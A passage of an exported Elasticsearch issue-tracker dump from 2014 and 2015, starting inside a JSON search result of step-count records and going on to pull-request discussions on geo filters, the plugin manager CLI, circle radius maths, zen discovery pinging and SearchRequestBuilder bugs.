               "data": {
                  "distance": 10.458,
                  "end_date": 1408453879.153991,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408452938.713164,
                  "number_of_steps": 14,
                  "duration": 940.4408271312714,
                  "order_date": 1408453879.153991,
                  "id": "1408452938.713164-0"
               },
               "user_id": 582313
            },
            "sort": [
               6.958682104e-315
            ]
         },
         {
            "_index": "myindex",
            "_type": "mytype",
            "_id": "582313_1408456930.040181-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 5.229,
                  "end_date": 1408463006.851273,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408456930.040181,
                  "number_of_steps": 7,
                  "duration": 6076.811092078686,
                  "order_date": 1408463006.851273,
                  "id": "1408456930.040181-0"
               },
               "user_id": 582313
            },
            "sort": [
               6.95870183e-315
            ]
         },
         {
            "_index": "myindex",
            "_type": "mytype",
            "_id": "582313_1407790800-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 2.241,
                  "end_date": 1407823148.624126,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1407790800,
                  "number_of_steps": 3,
                  "duration": 32348.62412595749,
                  "order_date": 1407823148.624126,
                  "id": "1407790800-0"
               },
               "user_id": 582313
            },
            "sort": [
               1407790800
            ]
         },
         {
            "_index": "myindex",
            "_type": "mytype",
            "_id": "582313_1407823148.624126-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 1706.148,
                  "end_date": 1407877200,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1407823148.624126,
                  "number_of_steps": 2284,
                  "duration": 54051.37587404251,
                  "order_date": 1407877200,
                  "id": "1407823148.624126-0"
               },
               "user_id": 582313
            },
            "sort": [
               1407823148.624126
            ]
         },
         {
            "_index": "myindex",
            "_type": "mytype",
            "_id": "582313_1407877200-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 4134.645,
                  "end_date": 1407963600,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1407877200,
                  "number_of_steps": 5535,
                  "duration": 86400,
                  "order_date": 1407963600,
                  "id": "1407877200-0"
               },
               "user_id": 582313
            },
            "sort": [
               1407877200
            ]
         },
         {
            "_index": "myindex",
            "_type": "mytype",
            "_id": "582313_1407963600-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 6652.035,
                  "end_date": 1408050000,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1407963600,
                  "number_of_steps": 8905,
                  "duration": 86400,
                  "order_date": 1408050000,
                  "id": "1407963600-0"
               },
               "user_id": 582313
            },
            "sort": [
               1407963600
            ]
         },
         {
            "_index": "myindex",
            "_type": "mytype",
            "_id": "582313_1408050000-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 5336.568,
                  "end_date": 1408136400,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408050000,
                  "number_of_steps": 7144,
                  "duration": 86400,
                  "order_date": 1408136400,
                  "id": "1408050000-0"
               },
               "user_id": 582313
            },
            "sort": [
               1408050000
            ]
         },
         {
            "_index": "myindex",
            "_type": "mytype",
            "_id": "582313_1408136400-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 10236.141,
                  "end_date": 1408222800,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408136400,
                  "number_of_steps": 13703,
                  "duration": 86400,
                  "order_date": 1408222800,
                  "id": "1408136400-0"
               },
               "user_id": 582313
            },
            "sort": [
               1408136400
            ]
         },
         {
            "_index": "myindex",
            "_type": "mytype",
            "_id": "582313_1408222800-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 4076.379,
                  "end_date": 1408309200,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408222800,
                  "number_of_steps": 5457,
                  "duration": 86400,
                  "order_date": 1408309200,
                  "id": "1408222800-0"
               },
               "user_id": 582313
            },
            "sort": [
               1408222800
            ]
         },
         {
            "_index": "myindex",
            "_type": "mytype",
            "_id": "582313_1408309200-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 3161.304,
                  "end_date": 1408395600,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408309200,
                  "number_of_steps": 4232,
                  "duration": 86400,
                  "order_date": 1408395600,
                  "id": "1408309200-0"
               },
               "user_id": 582313
            },
            "sort": [
               1408309200
            ]
         },
         {
            "_index": "myindex",
            "_type": "mytype",
            "_id": "582313_1408395600-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 2337.363,
                  "end_date": 1408474407.530582,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408395600,
                  "number_of_steps": 3129,
                  "duration": 78807.53058201075,
                  "order_date": 1408474407.530582,
                  "id": "1408395600-0"
               },
               "user_id": 582313
            },
            "sort": [
               1408395600
            ]
         },
         {
            "_index": "myindex",
            "_type": "mytype",
            "_id": "582313_1408463037.221965-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 177.786,
                  "end_date": 1408470644.548557,
                  "calories": 0,
                  "motion_type": "stationary",
                  "start_date": 1408463037.221965,
                  "number_of_steps": 238,
                  "duration": 7607.326591610909,
                  "order_date": 1408470644.548557,
                  "id": "1408463037.221965-0"
               },
               "user_id": 582313
            },
            "sort": [
               1408463037.221965
            ]
         }
      ]
   },
   "aggregations": {
      "max": {
         "value": 4743694330017250000
      }
   }
}
```
</comment><comment author="clintongormley" created="2014-08-20T07:43:44Z" id="52743803">@OlegYch Do you have `data.start_date` and `data.order_date` in a different type in the same index, but with a different mapping?
</comment><comment author="clintongormley" created="2014-08-20T07:47:18Z" id="52744107">Closing as per #7343 - mixed mappings for the same field name
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fixes BoundingBox across complete longitudinal range</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7340</link><project id="" key="" /><description>Adds a special case to the GeoBoundingBoxFilterParser so that the left of the box is not normalised int he case where left = -180 and right = 180.  Before this change the left would be normalised to 180 in this case and the filter would only match points with a longitude of 180 (or -180).

Closes #5218
</description><key id="40608424">7340</key><summary>Fixes BoundingBox across complete longitudinal range</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>:Geo</label><label>enhancement</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-08-19T16:13:35Z</created><updated>2015-06-07T10:10:21Z</updated><resolved>2014-09-12T09:17:52Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-20T16:29:54Z" id="52803920">https://github.com/elasticsearch/elasticsearch/issues/5128 looks completely unrelated?
</comment><comment author="clintongormley" created="2014-08-22T12:54:28Z" id="53056586">@jpountz fixed the original issue to point to #5218 
</comment><comment author="jpountz" created="2014-08-28T13:09:05Z" id="53716725">@colings86 replied to your comment, your suggestion sounds good to me
</comment><comment author="jpountz" created="2014-09-12T08:18:45Z" id="55374040">LGTM
</comment><comment author="colings86" created="2014-09-12T09:17:52Z" id="55379290">Pushed to master and 1.x
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Internal: Move plugin manager to new CLI</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7339</link><project id="" key="" /><description>PluginManager could now be rewritten using the new Command Line Interface framework.
# How does it work?

The new `bin/plugin` tool works now as this:

```
bin/plugin command [options] &lt;command_parameter&gt;
```

`command_parameter` could be mandatory depending on the `command`.
## Generic options

Some options could be applied to any plugin command:
- `--help`, `-h`
- `--silent`, `-s`
- `--verbose`, `-v`
## Install

```
bin/plugin install [options] &lt;plugin_name&gt;
```

`plugin_name` is mandatory. Still using the same form as used before with the plugin manager.

Options could be:

`--timeout &lt;timeout_value&gt;`, `-t &lt;timeout_value&gt;`
`--url &lt;url&gt;`, `-u &lt;url&gt;`
## Uninstall (Remove)

```
bin/plugin uninstall [options] &lt;plugin_name&gt;
```

`plugin_name` is mandatory. Still using the same form as used before with the plugin manager.
## List

```
bin/plugin list [options]
```
# Breaking changes

Some important changes for `bin/plugin` application:

| Old option | New option |
| --- | --- |
| `--install pluginname` | `install pluginname` |
| `-i pluginname` | `install pluginname` |
| `-install pluginname` | `install pluginname` |
| `--remove pluginname` | `uninstall pluginname` |
| `-r pluginname` | `uninstall pluginname` |
| `-remove pluginname` | `uninstall pluginname` |
| `remove pluginname` | `uninstall pluginname` |
| `-l` | `list` |
| `--list` | `list` |
| `-url &lt;url&gt;` | `--url &lt;url&gt;` or `-u &lt;url&gt;` |
| `url &lt;url&gt;` | `--url &lt;url&gt;` or `-u &lt;url&gt;` |
| `-verbose` | `--verbose` or `-v` |
| `verbose` | `--verbose` or `-v` |
| `-silent` | `--silent` or `-s` |
| `silent` | `--silent` or `-s` |
| `-timeout &lt;time&gt;` | `--timeout &lt;time&gt;` or `-t &lt;time&gt;` |
| `timeout &lt;time&gt;` | `--timeout &lt;time&gt;` or `-t &lt;time&gt;` |

But the new PluginTool still support for elasticsearch 1.4 old options/commands format and will translate old options to the new one.

Deprecated format will be removed in an upcoming version (1.5? or 2.0?)
# Tests

Many tests have been adapted to the new CLI. Some randomization has been added as well.
New tests have been added as well.

Also, I ran some manual end user tests such as:

``` sh
# Test non existing plugin
bin/plugin install dummy/donotexist
bin/plugin install dummy/donotexist -v
bin/plugin install dummy/donotexist -s
# Test es.org download service
bin/plugin install elasticsearch/elasticsearch-cloud-azure/2.4.0
bin/plugin uninstall elasticsearch/elasticsearch-cloud-azure/2.4.0
# Test maven central download
bin/plugin install org.elasticsearch/elasticsearch-cloud-azure/2.4.0 -v
# Test install from github master download
bin/plugin install mobz/elasticsearch-head -v
bin/plugin uninstall mobz/elasticsearch-head
# Test install using URL
bin/plugin install head -v -u https://github.com/mobz/elasticsearch-head/archive/master.zip
# Test list plugins (with empty or one or many plugins)
bin/plugin list
```
# Remaining questions
- We change `PluginManager` class name to `PluginTool` class name. Should we keep the old name (so we don't change `bin/plugin` and `bin/plugin.bat` files)?
- This PR contains a fix when CLI is set to `silent` but in case of error it still prints out an error message. Should this be part of another PR? See https://github.com/dadoonet/elasticsearch/commit/25d332b8d5335f22693d26bc4e57d5d5522b5c7c

Related to #7094
</description><key id="40601837">7339</key><summary>Internal: Move plugin manager to new CLI</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/tlrx/following{/other_user}', u'events_url': u'https://api.github.com/users/tlrx/events{/privacy}', u'organizations_url': u'https://api.github.com/users/tlrx/orgs', u'url': u'https://api.github.com/users/tlrx', u'gists_url': u'https://api.github.com/users/tlrx/gists{/gist_id}', u'html_url': u'https://github.com/tlrx', u'subscriptions_url': u'https://api.github.com/users/tlrx/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/642733?v=4', u'repos_url': u'https://api.github.com/users/tlrx/repos', u'received_events_url': u'https://api.github.com/users/tlrx/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/tlrx/starred{/owner}{/repo}', u'site_admin': False, u'login': u'tlrx', u'type': u'User', u'id': 642733, u'followers_url': u'https://api.github.com/users/tlrx/followers'}</assignee><reporter username="">dadoonet</reporter><labels><label>:Plugins</label><label>feature</label></labels><created>2014-08-19T15:11:57Z</created><updated>2015-06-10T09:31:26Z</updated><resolved>2015-03-05T15:23:41Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="uboness" created="2014-08-19T17:28:08Z" id="52668795">&gt; We change PluginManager class name to PluginTool class name. Should we keep the old name (so we don't change bin/plugin and bin/plugin.bat files)?

yes, it should be named PluginManager (as before)...

&gt; This PR contains a fix when CLI is set to silent but in case of error it still prints out an error message. Should this be part of another PR?

it's not a bug... I believe that even in silence mode you still want to see an error if the cmd you executed failed
</comment><comment author="dadoonet" created="2014-08-19T17:32:39Z" id="52669452">&gt; it's not a bug... I believe that even in silence mode you still want to see an error if the cmd you executed failed

I think you expect rely on error code only? IIRC that was what we talked about with @karmi some months ago.

By the way, while we are at it, I now recall that we started discussing to rename `plugin` to `elasticsearch-plugin`. May be it's the right time for doing that change as well? 
</comment><comment author="spinscale" created="2014-08-21T07:01:38Z" id="52885214">left a few comments, why `remove` was renamed to `uninstall`?
</comment><comment author="dadoonet" created="2014-08-21T14:00:08Z" id="52923356">Thanks @spinscale!
I pushed another commit. Note that my first push was incorrect with failing tests. I don't know what happened there as I'm pretty sure I ran all tests before pushing.... :/ 

Change is:

``` java
PluginTool.Install install = new PluginTool.Install(captureTerminal, null, pluginName, null, downloadHelper);
```

to

``` java
PluginTool.Install install = new PluginTool.Install(captureTerminal, localResourceName == null ? null : "http://fakeurl", pluginName, null, downloadHelper);
```

It needs a fake URL to have our `ResourceDownloadHelper` being called.

Can you run another review?
</comment><comment author="dadoonet" created="2014-08-21T14:02:35Z" id="52923703">BTW I forgot to answer about `remove` vs `uninstall`. @uboness and I found more common to use an `uninstall` terminology than a `remove` one.

You basically uninstall application more than you remove an application, right?

But we can have this naming debate with the team.
</comment><comment author="dadoonet" created="2014-08-21T14:07:55Z" id="52924423">I also re- renamed `PluginTool` to `PluginManager`.
For the record, we decided internally to not rename `plugin` to `elasticsearch-plugin` or something else. People who really needs it could create an alias to this command with whatever name they want.
</comment><comment author="dadoonet" created="2014-09-01T07:53:50Z" id="54031134">About the documentation, I think that I should not really replace old documentation by the new one because although plugin manager 1.4 will still support deprecated commands, older versions won't support documented commands.

So I guess I need to add a section for `Added in 1.4` and mark old section as `Removed in 1.4` or so...
</comment><comment author="dadoonet" created="2014-09-08T15:30:21Z" id="54838000">@spinscale I updated the PR with most of your comments. I also added a "deprecated in 1.4.0" section in documentation to make sure users of older version still can have documentation about the plugin manager.

Also I rebased on latest master and force pushed on my repo.

Let me know
</comment><comment author="spinscale" created="2014-09-10T07:19:34Z" id="55079492">left a couple of other comments so far, but I think its close
</comment><comment author="s1monw" created="2014-09-10T07:33:34Z" id="55080635">moved to 1.5 - if we make it fine, then we can relabel
</comment><comment author="dadoonet" created="2014-09-22T13:38:12Z" id="56373476">@spinscale @uboness having time for another review? Thanks!
</comment><comment author="dadoonet" created="2014-10-06T13:12:34Z" id="58014464">@spinscale @uboness Any chance you could review it?
</comment><comment author="dadoonet" created="2014-10-07T14:26:05Z" id="58192408">For information, now that https://github.com/elasticsearch/elasticsearch/pull/7890 has been merged, I'll rebase my code and submit an update to this PR.
</comment><comment author="dadoonet" created="2014-10-18T17:38:21Z" id="59622924">@uboness @spinscale I rebased my changes on master, squashed and force pushed to my branch.
I think we are close and would love you give another look.

Thanks guys!

BTW, could you comment as well if we add this in 1.4 or 1.5?

cc @clintongormley @tlrx 
</comment><comment author="clintongormley" created="2014-10-20T13:30:33Z" id="59753592">@spinscale could you take a look at this one please?
</comment><comment author="dadoonet" created="2014-11-26T13:35:50Z" id="64604643">@javanna I just rebased everything on latest master branch. Though I think I'll have to do it again when #8666 will be merged. Any chance you could review this? Thanks a lot!
</comment><comment author="dadoonet" created="2014-12-03T12:38:22Z" id="65400940">@javanna I rebased everything on master because lot of things changed with #8666 (File / Path).
You can start reviewing it. Let me know if you can't do it before the end of this week.
</comment><comment author="javanna" created="2014-12-04T13:49:34Z" id="65633748">hey @dadoonet I doubt I will have time this week, this is a big PR and I need also to have a look at the new cli infra this PR is based on and get familiar with it. Sorry it's taking so long, maybe you can find somebody else to review it?
</comment><comment author="dadoonet" created="2015-01-02T16:19:31Z" id="68538548">@javanna I rebased on latest master branch:
- remove calls to `File` forbidden API
- update documentation as this PR will go most likely only in 2.0.0
</comment><comment author="dadoonet" created="2015-01-29T09:08:35Z" id="71991589">@spinscale Rebased to master. Ready for review... Thanks a lot! :)
</comment><comment author="dadoonet" created="2015-02-03T10:39:36Z" id="72629195">Assigning to @tlrx as he will also make some changes in the future in the Plugin Manager.

Tanguy, when your changes are done, please rebase my PR and create another one someone can review.
</comment><comment author="tlrx" created="2015-03-05T15:23:40Z" id="77382832">Closed in favor of #9998
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix circle radius calculation</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7338</link><project id="" key="" /><description>This change fixes the creation circle shapes o it calculates it correctly instead of essentially using the diameter as the radius.  The radius has to be converted into degrees but calculating the ratio of the desired radius to the circumference of the earth and then multiplying it by 360 (number of degrees around the earths circumference).  This issue here was that it was only multiplied by 180 making the result out by a factor of 2.  Also made the test for circles actually check to make sure it has the correct centre and radius.

Closes #7301
</description><key id="40600237">7338</key><summary>Fix circle radius calculation</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>:Geo</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-19T14:57:49Z</created><updated>2015-06-07T19:05:26Z</updated><resolved>2014-08-20T15:24:30Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-20T14:07:42Z" id="52782733">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Facets: Removal from master.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7337</link><project id="" key="" /><description /><key id="40588978">7337</key><summary>Facets: Removal from master.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jpountz</reporter><labels><label>:Aggregations</label><label>breaking</label><label>v2.0.0-beta1</label></labels><created>2014-08-19T13:08:44Z</created><updated>2015-06-06T16:39:29Z</updated><resolved>2014-08-21T08:42:19Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-21T08:08:32Z" id="52890402">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>UnicastZenPing should also ping last known discoNodes</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7336</link><project id="" key="" /><description>At the moment, when a node looses connection to the master (due to a partition or the master was stopped), we ping the unicast hosts in order to discover other nodes and elect a new master or get of another master than has been elected in the mean time. This can go wrong if all unicast targets are on the same side of a minority partition and therefore will never rejoin once the partition is healed.

Note: this is agains the `feature/improve_zen` branch
</description><key id="40584809">7336</key><summary>UnicastZenPing should also ping last known discoNodes</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:Discovery</label><label>enhancement</label><label>resiliency</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-19T12:17:38Z</created><updated>2015-06-07T12:21:06Z</updated><resolved>2014-08-20T13:50:18Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-08-19T12:54:47Z" id="52628587">Left one comment regarding unit test for elect logic, other than that LGTM.
</comment><comment author="bleskes" created="2014-08-19T13:11:07Z" id="52630764">@martijnvg added unit tests.
</comment><comment author="martijnvg" created="2014-08-19T19:09:48Z" id="52683651">@bleskes LGTM
</comment><comment author="kimchy" created="2014-08-20T03:29:50Z" id="52730084">lgtm
</comment><comment author="dadoonet" created="2014-09-05T14:18:30Z" id="54630474">@bleskes Should we label this issue with 1.4.0 and 2.0.0? 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Indexed Scripts/Templates: Return error message on 404</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7335</link><project id="" key="" /><description>This commit adds support for messages such as :

```
{
  "status" : 404,
  "error" : "IndexedScriptMissingException[[asdasdasfe] missing]"
}
{
  "status" : 404,
  "error" : "IndexedSearchTemplateMissingException[[asdasdasdas] missing]"
}
```

When non existant indexed scripts and templates are requested from get and delete REST endpoints.

See #7325
</description><key id="40577856">7335</key><summary>Indexed Scripts/Templates: Return error message on 404</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">GaelTadh</reporter><labels><label>:Indexed Scripts/Templates</label><label>enhancement</label><label>v1.6.0</label><label>v2.0.0-beta1</label></labels><created>2014-08-19T10:36:08Z</created><updated>2015-04-02T14:51:17Z</updated><resolved>2015-04-02T14:51:17Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-21T08:12:11Z" id="52890746">left one comment
</comment><comment author="jpountz" created="2014-08-29T13:02:20Z" id="53872074">LGTM
</comment><comment author="s1monw" created="2014-09-08T15:34:14Z" id="54838632">@GaelTadh this is good to go?
</comment><comment author="s1monw" created="2014-09-08T15:36:21Z" id="54839002">I removed the labels since we have an issue for this already
</comment><comment author="martijnvg" created="2014-09-09T14:09:47Z" id="54974158">Reopening... I accidentally used the wrong PR number in a commit.
</comment><comment author="clintongormley" created="2014-11-11T19:45:02Z" id="62607376">@GaelTadh a reminder about this one
</comment><comment author="javanna" created="2015-03-21T09:51:09Z" id="84292304">This is good to go I think, @GaelTadh can you merge? Otherwise I can do it, just let me know.
</comment><comment author="javanna" created="2015-04-02T14:51:16Z" id="88934607">Superseded by #10396.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>SearchRequestBuilder.toString modifies the SearchRequestBuilder wiping any source set.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7334</link><project id="" key="" /><description>This fixes #7317.
SearchRequestBuilder.toString now attempts to render the request's source before falling back to using the internal builder.

Closes #5576 
Closes #5555
</description><key id="40570367">7334</key><summary>SearchRequestBuilder.toString modifies the SearchRequestBuilder wiping any source set.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">GaelTadh</reporter><labels /><created>2014-08-19T08:55:57Z</created><updated>2015-03-02T15:16:12Z</updated><resolved>2015-03-02T11:44:03Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="GaelTadh" created="2014-08-19T10:56:41Z" id="52617837">@javanna I think this is the correct behavior for both of these builders, with tests.
</comment><comment author="javanna" created="2014-08-20T10:48:14Z" id="52760024">Left some comments, thanks for looking into these issues!
</comment><comment author="clintongormley" created="2014-11-11T19:43:53Z" id="62607101">Hi @GaelTadh - just a reminder about this one
</comment><comment author="clintongormley" created="2014-12-30T14:51:01Z" id="68362049">@GaelTadh and another reminder 
</comment><comment author="cooniur" created="2015-02-27T22:01:36Z" id="76480226">Or something like this?:

```
   @Override
public String toString() {
    if (sourceBuilder != null) {
        return sourceBuilder.toString();
    }

    if (request.source() != null) {
        return request.source().toUtf8();
    }
    return "{ }";
}
```
</comment><comment author="jprante" created="2015-02-27T23:24:50Z" id="76491821">This is a really subtle and longstanding bug and the fix should be IMHO applied to 1.4 branch asap.
</comment><comment author="cooniur" created="2015-02-27T23:29:24Z" id="76492311">@jprante vote +1 for applying to 1.4 branch

We found our current application broken only because we turned on the trace level logger to debug our application, where we use the `toString()` method to trace the request , but unexpectedly step upon this bug.

Thank god it was not in the production environment, but it could cause far more worse issues if it were in production environment.
</comment><comment author="javanna" created="2015-03-02T11:44:03Z" id="76698470">Closing in favour of #9944
</comment><comment author="javanna" created="2015-03-02T15:16:12Z" id="76729221">This will be fixed as soon as #9944 gets in, I am on it. Just wanted to add that #9201 will make all these problems go away on the long run, I invite you all to watch that other issue (aimed for 2.0) if you are using the Java API.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Get request while percolating existing documents to keep around headers and context of the original percolate request</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7333</link><project id="" key="" /><description /><key id="40569535">7333</key><summary>Get request while percolating existing documents to keep around headers and context of the original percolate request</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-19T08:44:58Z</created><updated>2015-06-07T12:21:15Z</updated><resolved>2014-08-19T12:35:10Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-08-19T11:16:39Z" id="52619427">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Efficient merging of arrays of unique values during update</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7332</link><project id="" key="" /><description>A common use case with updates is the need to add elements to an array only if they don't already exist.  Typically the way users implement this is to loop over every value using `.contains()` to check if the value is already there.

This works well for small arrays, but becomes progressively more expensive as the array grows (and big arrays are usually the ones adding lots of values).

It would be nice to provide a helper method which uses a more efficient algorithm to do this.

This could either be implemented as a helper method to be used in scripting, or possibly in association with https://github.com/elasticsearch/elasticsearch/issues/7030
</description><key id="40567601">7332</key><summary>Efficient merging of arrays of unique values during update</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">clintongormley</reporter><labels><label>adoptme</label><label>feature</label></labels><created>2014-08-19T08:15:41Z</created><updated>2015-11-21T17:13:32Z</updated><resolved>2015-11-21T17:13:32Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="gmenegatti" created="2014-11-20T12:41:37Z" id="63802108">Hi guys, please, any update on that?
Thanks so much.
